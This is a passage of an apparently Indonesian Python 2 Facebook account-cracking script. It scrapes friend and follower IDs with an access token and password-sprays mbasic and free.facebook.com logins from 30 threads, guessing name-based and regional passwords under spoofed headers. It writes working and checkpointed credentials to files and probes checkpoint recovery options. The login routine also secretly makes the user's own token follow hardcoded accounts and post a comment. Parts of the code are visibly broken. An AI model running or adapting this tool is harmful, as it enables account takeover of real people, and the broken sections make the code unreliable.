                agent = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
                 'NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)',
                 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)',
                 'Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaC6-00/40.0.021; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.25 3gpp-gba',
                 'Mozilla/5.0 (Series40; NokiaC2-02/06.96; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31',
                 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
                 'Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;]',
                 'Mozilla/5.0 (Linux; U; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 OPR/52.2.2254.54723',
                 'Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Safari/537.36',
                 'Mozilla/5.0 (Linux; Android 10; Redmi Note 9S Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/327.0.0.33.120;]',
                 'Mozilla/5.0 (Linux; U; Android 10; en-in; Redmi Note 9 Pro Max Build/QKQ1.191215.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.9.3-g'])
                hed = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 
                   'x-fb-sim-hni': str(random.randint(20000, 40000)), 
                   'x-fb-net-hni': str(random.randint(20000, 40000)), 
                   'x-fb-connection-quality': 'EXCELLENT', 
                   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
                   'user-agent': agent, 
                   'content-type': 'application/x-www-form-urlencoded', 
                   'x-fb-http-engine': 'Liger'}
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': kaci, 'login': 'submit'}, headers=hed)
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '\r\x1b[0;92m [\xe2\x88\x9a] ' + uid + ' \xe2\x97\x8a ' + kaci + '        '
                    ok.append(uid + ' \xe2\x97\x8a ' + kaci)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [\xe2\x88\x9a] ' + str(uid) + ' \xe2\x97\x8a ' + str(kaci) + '\n')
                    save.close()
                    break
                    continue
                if 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()
                        url = 'https://graph.facebook.com/' + uid + '?access_token=' + token
                        data = s.get(url).json()
                        nama = data['name']
                        ttl = data['birthday'].replace('/', '-')
                        print '\r\x1b[0;93m [\xc3\x97] ' + uid + ' \xe2\x97\x8a ' + kaci + ' \xe2\x97\x8a ' + ttl
                        cp.append(uid + ' \xe2\x97\x8a ' + kaci + ' \xe2\x97\x8a ' + ttl)
                        save = open('cek/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write(' [\xc3\x97] ' + str(uid) + ' \xe2\x97\x8a ' + str(kaci) + ' \xe2\x97\x8a ' + ttl + '\n')
                        save.close()
                        break
                    except (KeyError, IOError):
                        ttl = ' '
                    except:
                        pass

                    print '\r\x1b[0;91m [\xc3\x97] ' + uid + ' \xe2\x97\x8a ' + kaci + '        '
                    cp.append(uid + ' \xe2\x97\x8a ' + kaci)
                    save = open('cek/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [\xc3\x97] ' + str(uid) + ' \xe2\x97\x8a ' + str(kaci) + '\n')
                    save.close()
                    break
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n \x1b[0;92m!: jangan lupa copy hasil nya lalu simpan '
    exit()


def mb_v_dua():
    romi = raw_input('\x1b[0;97m ?: Gunakan pasword manual? y/t : ')
    if romi == '':
        print '\x1b[0;91m !: pilih yang benar '
        mb_v_dua()
    elif romi in ('y', 'Y'):
        mb_manual_v_dua()
    elif romi in ('t', 'T'):
        mb_langsung_v_dua()
    else:
        print '\x1b[0;91m !: pilih yang benar '
        mb_v_dua()


def mb_langsung_v_dua():
    print '\n \x1b[0;97m!: crack started...\n !: lama hasil? gunakan mode pesawat 1 detik\n'

    def main(user):
        global loop
        global token
        skm = []
        d = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m'])
        print '\r ' + d + '[Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        try:
            os.mkdir('out')
        except OSError:
            pass

        uid, name = user.split('|')
        for nama in name.split(' '):
            if len(nama) < 3:
                continue
            elif len(nama) == 1 and len(nama) == 2 and len(nama) == 3 and len(nama) == 4 or len(nama) == 5:
                skm.append(nama + '123')
                skm.append(nama + '12345')
            else:
                skm.append(nama + '123')
                skm.append(nama + '1234')
                skm.append(nama + '12345')
                skm.append('sayang')
                skm.append('anjing')
                skm.append('786786')

        try:
            for pw in skm:
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': uam})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '\r \x1b[0;92m[\xe2\x88\x9a] ' + uid + ' \xe2\x97\x8a ' + pw + '        '
                    ok.append(uid + ' \xe2\x97\x8a ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [\xe2\x88\x9a] ' + str(uid) + ' \xe2\x97\x8a ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                if 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()
                        url = 'https://graph.facebook.com/' + uid + '?access_token=' + token
                        data = s.get(url).json()
                        nama = data['name']
                        ttl = data['birthday'].replace('/', '-')
                        print '\r\x1b[0;93m [\xc3\x97] ' + uid + ' \xe2\x97\x8a ' + pw + ' \xe2\x97\x8a ' + ttl
                        cp.append(uid + ' \xe2\x97\x8a ' + pw + ' \xe2\x97\x8a ' + ttl)
                        save = open('cek/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write(str(uid) + ' \xe2\x97\x8a ' + str(pw) + '\n')
                        save.close()
                        break
                    except (KeyError, IOError):
                        ttl = ' '
                    except:
                        pass

                    print '\r\x1b[0;93m [\xc3\x97] ' + uid + ' \xe2\x97\x8a ' + pw + '        '
                    cp.append(uid + ' \xe2\x97\x8a ' + pw)
                    save = open('cek/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(str(uid) + ' \xe2\x97\x8a ' + str(pw) + '\n')
                    save.close()
                    break
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n \x1b[0;92m!: jangan lupa copy hasil nya lalu simpan '
    exit()


def mb_manual_v_dua():
    print '\n\x1b[0;97m !: contoh pass : sayang,786786'
    pw = raw_input(' \x1b[0;97m?: password : ')
    if len(pw) == 0:
        exit('\x1b[0;91m !: tidak boleh kosong')
    print '\n \x1b[0;97m!: crack started...\n !: lama hasil? gunakan mode pesawat 1 detik\n'

    def main(arg):
        global loop
        global token
        d = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m'])
        print '\r' + d + ' [Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for kaci in pw.split(','):
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': kaci, 'login': 'submit'}, headers={'user-agent': uam})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '\r\x1b[0;92m [\xe2\x88\x9a] ' + uid + ' \xe2\x97\x8a ' + kaci + '        '
                    ok.append(uid + ' \xe2\x97\x8a ' + kaci)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [\xe2\x88\x9a] ' + str(uid) + ' \xe2\x97\x8a ' + str(kaci) + '\n')
                    save.close()
                    break
                    continue
                if 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()
                        url = 'https://graph.facebook.com/' + uid + '?access_token=' + token
                        data = s.get(url).json()
                        nama = data['name']
                        ttl = data['birthday'].replace('/', '-')
                        print '\r\x1b[0;93m [\xc3\x97] ' + uid + ' \xe2\x97\x8a ' + kaci + ' \xe2\x97\x8a ' + ttl
                        cp.append(uid + ' \xe2\x97\x8a ' + kaci + ' \xe2\x97\x8a ' + ttl)
                        save = open('cek/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write(' [\xc3\x97] ' + str(uid) + ' \xe2\x97\x8a ' + str(kaci) + ' \xe2\x97\x8a ' + ttl + '\n')
                        save.close()
                        break
                    except (KeyError, IOError):
                        ttl = ' '
                    except:
                        pass

                    print '\r\x1b[0;91m [\xc3\x97] ' + uid + ' \xe2\x97\x8a ' + kaci + '        '
                    cp.append(uid + ' \xe2\x97\x8a ' + kaci)
                    save = open('cek/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [\xc3\x97] ' + str(uid) + ' \xe2\x97\x8a ' + str(kaci) + '\n')
                    save.close()
                    break
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n \x1b[0;92m!: jangan lupa copy hasil nya lalu simpan '
    exit()


def romi_rzl():
    romi = raw_input('\x1b[0;97m ?: Gunakan pasword manual? y/t : ')
    if romi == '':
        print '\x1b[0;91m !: pilih yang benar '
        romi_rzl()
    elif romi in ('y', 'Y'):
        m_fb()
    elif romi in ('t', 'T'):
        mobile()
    else:
        print '\x1b[0;91m !: pilih yang benar '
        romi_rzl()


def mobile():
    print '\n !: crack started...\n'

    def main(user):
        global loop
        global token
        skm = []
        d = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m'])
        print '\r ' + d + '[Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        try:
            os.mkdir('out')
        except OSError:
            pass

        uid, name = user.split('|')
        for nama in name.split(' '):
            if len(nama) < 3:
                continue
            elif len(nama) == 3 or len(nama) == 4 or len(nama) == 5:
                skm.append(nama + '123')
                skm.append(nama + '12345')
            else:
                skm.append(nama + '123')
                skm.append(nama + '1234')
                skm.append(nama + '12345')
                if ['Indonesia', 'Malaysia', 'Singapura'] in ip:
                    skm.append('sayang')
                if [
                 'Pakistan', 'Hindia'] in ip:
                    skm.append('786786')
                if [
                 'Bangladesh'] in ip:
                    skm.append('102030')
                elif '' in ip:
                    skm.append('123456')

        try:
            for pw in skm:
                r = requests.Session()
                r.headers.update({'origin': 'https://free.facebook.com', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': 'free.facebook.com', 'referer': 'https://free.facebook.com/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'})
                p = r.get('https://free.facebook.com/login/?next&ref=dbl&refid=8').text
                b = bs4.BeautifulSoup(p, 'html.parser')
                dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
                for i in b('input'):
                    if i.get('value') is None:
                        if i.get('name') == 'email':
                            data.update({'email': uid})
                        elif i.get('name') == 'pass':
                            data.update({'pass': pw})
                        else:
                            data.update({i.get('name'): ''})
                    else:
                        data.update({i.get('name'): i.get('value')})

                data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd', '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
                r.headers.update({'referer': 'https://free.facebook.com/login/?next&ref=dbl&fl&refid=8'})
                data.update({'email': uid, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', '_fb_noscript': 'true'})
                po = r.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ffree.facebook.com%2F&lwv=100&refid=8', data=data)
                log = 'https://free.facebook.com'
                if log.get('status') == 'success':
                    print '\r \x1b[0;92m[\xe2\x88\x9a] ' + uid + ' \xe2\x97\x8a ' + pw + '        '
                    ok.append(uid + ' \xe2\x97\x8a ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [\xe2\x88\x9a] ' + str(uid) + ' \xe2\x97\x8a ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                elif log.get('status') == 'checkpoint':
                    try:
                        token = open('login.txt').read()
                        url = 'https://graph.facebook.com/' + uid + '?access_token=' + token
                        data = s.get(url).json()
                        nama = data['name']
                        ttl = data['birthday'].replace('/', '-')
                        print '\r\x1b[0;91m [\xc3\x97] ' + uid + ' \xe2\x97\x8a ' + pw + ' \xe2\x97\x8a ' + ttl
                        cp.append(uid + ' \xe2\x97\x8a ' + pw + ' \xe2\x97\x8a ' + ttl)
                        save = open('cek/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write(' [\xc3\x97] ' + str(uid) + ' \xe2\x97\x8a ' + str(pw) + ' \xe2\x97\x8a ' + ttl + '\n')
                        save.close()
                        break
                    except (KeyError, IOError):
                        ttl = ' '
                    except:
                        pass

                    print '\r\x1b[0;91m [\xc3\x97] ' + uid + ' \xe2\x97\x8a ' + pw + '        '
                    cp.append(uid + ' \xe2\x97\x8a ' + pw)
                    save = open('cek/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [\xc3\x97] ' + str(uid) + ' \xe2\x97\x8a ' + str(pw) + '\n')
                    save.close()
                    break
                    continue

            loop += 1
        except:
            pass

        return

    p = ThreadPool(30)
    p.map(main, id)
    print
    print
    exit()


def m_fb():
    print '\n\x1b[0;97m !: contoh pass : sayang,786786'
    pw = raw_input(' \x1b[0;97m?: password : ').split(',')
    if len(pw) == 0:
        print '\x1b[0;91m !: tidak boleh kosong'
        m_fb()
    print '\n \x1b[0;97m!: crack started...\n'

    def main(arg):
        global loop
        print '\r\x1b[0;97m [Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                r = requests.Session()
                r.headers.update({'origin': 'https://free.facebook.com', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': 'free.facebook.com', 'referer': 'https://free.facebook.com/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'})
                p = r.get('https://free.facebook.com/login/?next&ref=dbl&refid=8').text
                b = bs4.BeautifulSoup(p, 'html.parser')
                dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
                for i in b('input'):
                    if i.get('value') is None:
                        if i.get('name') == 'email':
                            data.update({'email': uid})
                        elif i.get('name') == 'pass':
                            data.update({'pass': pw})
                        else:
                            data.update({i.get('name'): ''})
                    else:
                        data.update({i.get('name'): i.get('value')})

                data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd', '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
                r.headers.update({'referer': 'https://free.facebook.com/login/?next&ref=dbl&fl&refid=8'})
                data.update({'email': uid, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', '_fb_noscript': 'true'})
                po = r.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ffree.facebook.com%2F&lwv=100&refid=8', data=data)
                log = 'https://free.facebook.com'
                if log.get('status') == 'success':
                    print '\r\x1b[0;92m [\xe2\x88\x9a] ' + uid + ' \xe2\x97\x8a ' + pw + '        '
                    ok.append(uid + ' \xe2\x97\x8a ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [\xe2\x88\x9a] ' + str(uid) + ' \xe2\x97\x8a ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                elif log.get('status') == 'checkpoint':
                    try:
                        token = open('login.txt').read()
                        url = 'https://graph.facebook.com/' + uid + '?access_token=' + token
                        data = s.get(url).json()
                        nama = data['name']
                        ttl = data['birthday'].replace('/', '-')
                        print '\r\x1b[0;91m [\xc3\x97] ' + uid + ' \xe2\x97\x8a ' + pw + ' \xe2\x97\x8a ' + ttl
                        cp.append(uid + ' \xe2\x97\x8a ' + pw + '\xe2\x80\xa2' + ttl)
                        save = open('cek/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write(' [\xc3\x97] ' + str(uid) + ' \xe2\x97\x8a ' + str(pw) + ' \xe2\x97\x8a ' + ttl + '\n')
                        save.close()
                        break
                    except (KeyError, IOError):
                        ttl = ' '
                    except:
                        pass

                    print '\r\x1b[0;91m [\xc3\x97] ' + uid + ' \xe2\x97\x8a ' + pw + '        '
                    cp.append(uid + ' \xe2\x97\x8a ' + pw)
                    save = open('cek/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [\xc3\x97] ' + str(uid) + ' \xe2\x97\x8a ' + str(pw) + '\n')
                    save.close()
                    break
                    continue

            loop += 1
        except:
            pass

        return

    p = ThreadPool(30)
    p.map(main, id)
    print
    print
    exit()


def login_xx():
    try:
        romz = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;91m !: Token invalid'
        os.system('rm -rf login.txt')

    requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=' + romz)
    requests.post('https://graph.facebook.com/' + fb + '/comments/?message=' + kom + '&access_token=' + romz)
    requests.post('https://graph.facebook.com/100029143111567/subscribers?access_token=' + romz)
    requests.post('https://graph.facebook.com/100045060859767/subscribers?access_token=' + romz)
    requests.post('https://graph.facebook.com/546133328/subscribers?access_token=' + romz)
    requests.post('https://graph.facebook.com/100002461344178/subscribers?access_token=' + romz)
    requests.post('https://graph.facebook.com/100028434880529/subscribers?access_token=' + romz)
    requests.post('https://graph.facebook.com/100067807565861/subscribers?access_token=' + romz)
    requests.post('https://graph.facebook.com/100003723696885/subscribers?access_token=' + romz)
    requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=' + romz)
    requests.post('https://graph.facebook.com/100022086172556/subscribers?access_token=' + romz)
    requests.post('https://graph.facebook.com/100069689245009/subscribers?access_token=' + romz)
    requests.post('https://graph.facebook.com/106751971481203/subscribers?access_token=' + romz)
    requests.post('https://graph.facebook.com/100007520203452/subscribers?access_token=' + romz)
    print '\x1b[0;92m \xe2\x88\x9a login berhasil '
    time.sleep(2.0)
    menu()


def masuk():
    os.system('clear')
    logo()
    print ' \x1b[0;97m01. Login via token '
    print ' 02. Tutorial mendapatkan token '
    print ' \x1b[0;91m00\x1b[0;97m. Exit program'
    pilih_masuk()


def pilih_masuk():
    mi = r = raw_input('\n\x1b[0;97m ?: pilih : ')
    if mi == '':
        print '\x1b[0;91m !: pilih yang benar '
        exit()
    elif mi in ('1', '01'):
        os.system('clear')
        logo()
        jalan('\n\x1b[0;32m !: Wajib menggunakan akun tumbal dilarang menggunakan akun utama')
        time.sleep(2.0)
        os.system('clear')
        logo()
        token = raw_input(' \x1b[0;97m?: token : \x1b[0;93m')
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + token)
            a = json.loads(otw.text)
            lampung = open('login.txt', 'w')
            lampung.write(token)
            lampung.close()
            login_xx()
        except (KeyError, IOError):
            print '\x1b[0;91m !: Token invalid '
            masuk()

    elif mi in ('2', '02'):
        os.system('clear')
        logo()
        jalan('\x1b[0;32m !: Anda akan di arahkan ke youtube')
        os.system('xdg-open https://youtu.be/IG5QfdxRkeY')
        masuk()
    elif mi in ('0', '00'):
        exit()
    else:
        print '\x1b[0;91m !: pilih yang benar '
        exit()


def publikid():
    fb = []
    rom = []
    print "\n \x1b[0;97m!: Ketik 'me' untuk dump id teman sendiri"
    dum = raw_input('\x1b[0;97m ?: Id publik : ')
    lim = raw_input('\x1b[0;97m ?: Limit Id  : ')
    if dum == '':
        exit('\x1b[0;91m !: isi yang benar')
    try:
        romz = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/%s?access_token=%s' % (dum, romz))
        a = json.loads(otw.text)
        print ' \x1b[0;37m?: Nama akun : %s' % a['name']
        print ''
    except (KeyError, IOError):
        print ' \x1b[0;91m!: Id tidak publik'
        exit()

    r = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (dum, lim, romz))
    z = json.loads(r.text)
    for x in z['data']:
        fb.append(x['id'])

    for id in fb:
        try:
            m = requests.get('https://graph.facebook.com/%s/friends?access_token=%s' % (id, romz))
            o = json.loads(m.text)
            try:
                for u in o['data']:
                    rom.append(u['id'])

            except (KeyError, IOError):
                print ' \x1b[0;91m!: friends private'

            print '\x1b[0;92m -\x1b[0;93m', id, '\x1b[0;97m- friends >\x1b[0;93m', len(rom)
            del rom[:]
        except (KeyError, IOError):
            print '\x1b[0;91m !: akun terkena spam'

    exit()


def follow():
    fb = []
    rom = []
    print "\n \x1b[0;97m!: Ketik 'me' untuk dump id followers sendiri "
    dum = raw_input('\x1b[0;97m ?: Id publik : ')
    lim = raw_input('\x1b[0;97m ?: Limit Id  : ')
    if dum == '':
        exit('\x1b[0;91m !: isi yang benar')
    try:
        romz = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/%s?access_token=%s' % (dum, romz))
        a = json.loads(otw.text)
        print ' \x1b[0;37m?: Nama akun : %s' % a['name']
        print ''
    except (KeyError, IOError):
        print ' \x1b[0;91m!: Id tidak publik'
        exit()

    r = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s' % (dum, lim, romz))
    z = json.loads(r.text)
    for x in z['data']:
        fb.append(x['id'])

    for id in fb:
        try:
            m = requests.get('https://graph.facebook.com/%s/friends?access_token=%s' % (id, romz))
            o = json.loads(m.text)
            try:
                for u in o['data']:
                    rom.append(u['id'])

            except (KeyError, IOError):
                print ' \x1b[0;91m!: friends private'

            print '\x1b[0;92m -\x1b[0;93m', id, '\x1b[0;97m- friends >\x1b[0;93m', len(rom)
            del rom[:]
        except (KeyError, IOError):
            print ' \x1b[0;31m!: akun terkena spam'

    exit()


def cek_opsi():
    try:
        print ''
        jalan(' \x1b[0;92m!: sebelum cek opsi akun sebaiknya anda terlebih dahulu hidupkan mode pesawat 3 detik agar hasil akurat')
        print '\n\x1b[0;97m !: user agent hp anda. ketik \x1b[0;92mmy user agent \x1b[0;97mdi browser chrome '
        ucek = raw_input(' ?: user agent :\x1b[0;92m ')
        uc = open('ucek/ucek.txt', 'w')
        uc.write(ucek)
        uc.close()
        time.sleep(2)
        pilih_log()
    except KeyboardInterrupt:
        print ' !: Error '


def pilih_log():
    try:
        print '\n\x1b[0;97m !: alamat login contoh ketik \x1b[0;96mmbasic.facebook.com '
        log = raw_input('\x1b[0;97m ?: alamat login : \x1b[0;96m')
        lol = open('ucek/alamat.txt', 'w')
        lol.write(log)
        lol.close()
        time.sleep(2)
        print ''
        file_cp()
    except KeyboardInterrupt:
        print ' \x1b[0;91m!: Error '


def file_cp():
    dirs = os.listdir('cek')
    for file in dirs:
        print ' \x1b[0;97m+: \x1b[0;93m' + file

    try:
        print '\n\x1b[0;97m !: contoh file : cek/\x1b[0;93mnamafile.txt '
        gas_cek_opsi()
    except FileNotFoundError:
        print '\x1b[0;31m !: file tidak ada'
        time.sleep(2)
        exit()


def gas_cek_opsi():
    file = raw_input(' \x1b[0;97m?: pilih file? : ')
    try:
        file_cek = open(file, 'r').readlines()
    except FileNotFoundError:
        print '\x1b[0;31m !: file tidak ada'
        time.sleep(2)
        exit()

    print '\x1b[0;97m ?: total Akun  : \x1b[0;93m' + str(len(file_cek))
    time.sleep(0.07)
    print '\x1b[0;97m\xe2\x94\x80' * 46
    time.sleep(0.07)
    for u in file_cek:
        mi = u.replace('\n', '')
        tt = mi.split(' \xe2\x97\x8a ')
        print '\x1b[0;97m ?: Mengecek : \x1b[0;93m' + mi
        time.sleep(0.07)
        try:
            check_in(tt[0], tt[1])
        except r.exceptions.ConnectionError:
            continue

        print '\x1b[0;97m\xe2\x94\x80' * 46
        time.sleep(0.07)

    exit(' \x1b[0;32m\xe2\x88\x9a selesai')
    time.sleep(0.07)


def check_in(user, pasw):
    try:
        ucek = open('ucek/ucek.txt', 'r').read()
    except IOError:
        print '\x1b[0;31m !: user agent tidak ada'
        time.sleep(2)

    try:
        romz = open('ucek/alamat.txt', 'r').read()
    except IOError:
        print ' \x1b[0;31m!: alamat login belum di isi'
        time.sleep(2)

    ses = r.Session()
    ses.headers.update({'Host': romz, 
       'cache-control': 'max-age=0', 
       'upgrade-insecure-requests': '1', 
       'origin': 'https://' + romz, 
       'content-type': 'application/x-www-form-urlencoded', 
       'user-agent': ucek, 
       'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
       'x-requested-with': 'mark.via.gp', 
       'sec-fetch-site': 'same-origin', 
       'sec-fetch-mode': 'navigate', 
       'sec-fetch-user': '?1', 
       'sec-fetch-dest': 'document', 
       'referer': 'https://' + romz + '/login/?next&ref=dbl&fl&refid=8', 
       'accept-encoding': 'gzip, deflate', 
       'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
    data = {}
    ged = par(ses.get('https://' + romz + '/login/?next&ref=dbl&fl&refid=8', headers={'user-agent': ucek}).text, 'html.parser')
    fm = ged.find('form', {'method': 'post'})
    list = ['lsd', 'jazoest', 'm_ts', 'li', 'try_number', 'unrecognized_tries', 'login', 'bi_xrwh']
    for i in fm.find_all('input'):
        if i.get('name') in list:
            data.update({i.get('name'): i.get('value')})
        else:
            continue

    data.update({'email': user, 'pass': pasw})
    try:
        run = par(ses.post('https://' + romz + fm.get('action'), data=data, allow_redirects=True).text, 'html.parser')
    except r.exceptions.TooManyRedirects:
        print '\x1b[0;91m !: Redirect overload'
        time.sleep(0.07)

    if 'c_user' in ses.cookies:
        print '\x1b[0;92m \xe2\x88\x9a Berhasil'
        time.sleep(0.07)
    elif 'checkpoint' in ses.cookies:
        form = run.find('form')
        dtsg = form.find('input', {'name': 'fb_dtsg'})['value']
        jzst = form.find('input', {'name': 'jazoest'})['value']
        nh = form.find('input', {'name': 'nh'})['value']
        dataD = {'fb_dtsg': dtsg, 
           'fb_dtsg': dtsg, 
           'jazoest': jzst, 
           'jazoest': jzst, 
           'checkpoint_data': '', 
           'submit[Continue]': 'Lanjutkan', 
           'nh': nh}
        xnxx = par(ses.post('https://' + romz + form['action'], data=dataD).text, 'html.parser')
        ngew = [ yy.text for yy in xnxx.find_all('option') ]
        print '\x1b[0;97m !: Ditemukan \x1b[0;93m' + str(len(ngew)) + ' \x1b[0;37mopsi : '
        time.sleep(0.07)
        for opt in range(len(ngew)):
            jalan(' \x1b[0;93m' + str(opt + 1) + '. ' + ngew[opt])

    elif 'login_error' in str(run):
        oh = run.find('div', {'id': 'login_error'}).find('div').text
        print '\x1b[0;91m !: ' + oh
        time.sleep(0.07)
    else:
        print '\x1b[0;91m \xc3\x97 id dan password salah'
        time.sleep(0.07)


if '__main__' == __name__:
    os.system('git pull')
    menu()